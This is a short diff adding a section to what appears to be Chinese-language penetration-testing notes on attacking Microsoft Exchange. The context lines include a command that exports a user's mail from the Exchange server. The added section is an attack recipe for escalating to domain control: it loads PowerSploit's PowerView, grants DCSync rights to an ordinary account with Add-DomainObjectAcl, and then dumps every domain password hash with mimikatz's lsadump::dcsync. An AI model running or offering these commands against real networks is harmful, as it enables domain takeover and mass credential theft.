@@ -151,3 +151,22 @@ powershell -c "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$pwd
 
 导出用户test1的特定邮件到exchange服务器c:\test下 https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectExportMailfromExchange.ps1
 
+
+## 其他利用
+
+### exchange特定的ACL实现域提权
+
+拥有Exchange Trusted Subsystem或Exchange Windows Permission
+
+导入PowerViewr 
+
+https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+添加ACE
+
+Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity win7 -Rights DCSync -Verbose
+
+mimikatz导出hash
+
+mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
